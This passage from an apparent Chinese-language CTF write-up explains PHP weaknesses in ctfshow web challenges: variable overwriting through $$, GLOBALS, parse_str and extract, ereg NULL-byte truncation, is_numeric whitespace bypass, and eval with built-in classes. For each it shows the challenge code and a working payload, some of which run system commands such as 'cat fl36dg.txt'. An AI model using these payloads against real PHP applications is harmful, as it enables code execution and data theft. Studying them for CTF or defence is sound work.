punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload： GET: ?s&#x3D;flag POST: error&#x3D;s</p><p>$$key&#x3D;$$value &#x3D;&#x3D;&gt;$s&#x3D;$flag</p><p>$$key&#x3D;$$value &#x3D;&#x3D;&gt;$error&#x3D;$s</p><p>最后die($error);输出</p><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="GLOBALS"></a>GLOBALS</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>全局变量 为了满足条件，我们可以利用全局变量来进行赋值给ctfshow这个变量 </p><p>payload: ?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS </p><h3 id="parse-str-SERVER-‘QUERY-STRING’"><a href="#parse-str-SERVER-‘QUERY-STRING’" class="headerlink" title="parse_str($_SERVER[‘QUERY_STRING’])"></a>parse_str($_SERVER[‘QUERY_STRING’])</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 利用点是 <code>extract($_POST);</code> 进行解析<code>$_POST</code>数组。 parse_str($_SERVER[‘QUERY_STRING’])先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。 所以</p><p>payload: <code>?_POST[key1]=36d&amp;_POST[key2]=36d</code> </p><p>&#x3D;&#x3D;parse_str($_SERVER[‘QUERY_STRING’])&#x3D;&#x3D;&gt;</p><p><code>$_POST[key1]=36d;</code></p><p><code>$_POST[key2]=36d;</code> </p><h2 id="11、-ereg函数存在NULL截断漏洞"><a href="#11、-ereg函数存在NULL截断漏洞" class="headerlink" title="11、 ereg函数存在NULL截断漏洞"></a>11、 ereg函数存在NULL截断漏洞</h2><p>导致了正则过滤被绕过,所以可以使用%00截断正则匹配 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">#36d==>877</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?c&#x3D;a%00778</p><p>后面再利用弱类型匹配</p><h2 id="12、PHP内置类"><a href="#12、PHP内置类" class="headerlink" title="12、PHP内置类"></a>12、PHP内置类</h2><p>实现了to_string和构造函数的类</p><p> Exception 异常处理类 </p><p> Reflectionclass 反射函数类</p><p>FilesystemIterator  获取指定目录下的所有文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自己的payload：</p><p>原理就是<code>闭合和注释</code>，但是类必须实现tostring</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">?v1=Exception();system&amp;v2='tac fl36dg.txt');//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>官方payload：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">?v1=Exception&amp;v2=system('cat fl36dg.txt') ?v1=Reflectionclass&amp;v2=system('cat fl36dg.txt')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>原理：</p><p>Exception存在构造函数和tostring函数，会将传入的参数输出</p><p><img src="/images/image-20220809222919006-1662567087525.png" alt="image-20220809222919006"></p><p><img src="/images/image-20220809223038158-1662567087525.png" alt="image-20220809223038158"></p><p><img src="/images/image-20220809223223970-1662567087525.png" alt="image-20220809223223970"></p><p>然后<code>$v2()</code>会最为参数，如果$v2是函数名字，则先做函数执行，然后将返回值传入</p><p>最后输出</p><p><img src="/images/image-20220809223507138-1662567087525.png" alt="image-20220809223507138"></p><p>因为还有一对括号，所以最后system执行返回的数组，会再次当做函数执行，但执行失败，没有回显</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 </p><p><a href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a></p><p> <a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> </p><p>getcwd()函数 获取当前工作目录 返回当前工作目录 </p><p>payload: ?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd </p><p><strong>拿到文件名后直接url上访问</strong></p><h2 id="13、is-number的空格绕过"><a href="#13、is-number的空格绕过" class="headerlink" title="13、is_number的空格绕过"></a>13、is_number的空格绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>is_number函数在数字前加空格可以绕过</p><p> <code>%00</code>、<code>%09</code>、<code>%0a</code>、<code>%0b</code>、<code>%0c(换页键)</code>、<code>%0d</code> 都可以当做空格尝试使用绕过</p><p>后面trim函数为去除</p><p>“ “ (ASCII 32 (0x20)), an ordinary space.<br>“\t” (ASCII 9 (0x09)), a tab.<br>“\n” (ASCII 10 (0x0A)), a new line (line feed).<br>“\r” (ASCII 13 (0x0D)), a carriage return.<br>“\0” (ASCII 0 (0x00)), the NUL-byte.<br>“\v” (ASCII 11 (0x0B)), a vertical tab.</p><p>所以只剩下%0c可以使用，然后%0c36转化为数值照样是36</p><p>由于&#x3D;&#x3D;是同时转化为数字在比较，所以<code>“%0c36”==&quot;36&quot;</code></p><p>而!&#x3D;&#x3D;则先比较类型，类型不一致就flase</p><p>?num&#x3D;%0c36</p><h2 id="14、php中变量名特征"><a href="#14、php中变量名特征" class="headerlink" title="14、php中变量名特征"></a>14、php中变量名特征</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php变量名不允许<strong>使用点号,空格，会变成下划线</strong>,但如果出现了[，那么这个[转变为下划线后，后面的点并不会转化.</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag</p><p>(不知道变量名：POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo implode(get_defined_vars()))</p><p>也可以利用<strong>extract函数</strong>，进行变量覆盖</p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;extract($_POST)&amp;fl0g&#x3D;flag_give_me</p><p> GET:?1&#x3D;flag.php </p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1]) </p><h2 id="15、-SERVER-‘argv’-为脚本执行参数"><a href="#15、-SERVER-‘argv’-为脚本执行参数" class="headerlink" title="15、$_SERVER[‘argv’]为脚本执行参数"></a>15、$_SERVER[‘argv’]为脚本执行参数</h2><p> GET:?a&#x3D;1+fl0g&#x3D;flag_give_me </p><p>$_SERVER[‘argv’]&#x3D;&#x3D;&gt;数组，数组以空格（+）进行分割</p><p><code>$_SERVER[&#39;argv&#39;][1]=&quot;fl0g=flag_give_me&quot;</code></p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1]) </p><p>GET:?$fl0g&#x3D;flag_give_me </p><p><code>$_SERVER[&#39;argv&#39;][0]=&quot;$fl0g=flag_give_me&quot;</code></p><p>POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0]) </p><h2 id="16、gettext函数别名-x3D-gt"><a href="#16、gettext函数别名-x3D-gt" class="headerlink" title="16、gettext函数别名&#x3D;&gt;_"></a>16、gettext函数别名&#x3D;&gt;<code>_</code></h2><p><img src="/images/image-20220810135249819-1662567087525.png" alt="image-20220810135249819"></p><p>但是必须开启了gettext扩展</p><p><img src="/images/image-20220810135330920-1662567087525.png" alt="image-20220810135330920"></p><h2 id="17、get-defined-vars获取已经定义的变量（常用）"><a href="#17、get-defined-vars获取已经定义的变量（常用）" class="headerlink" 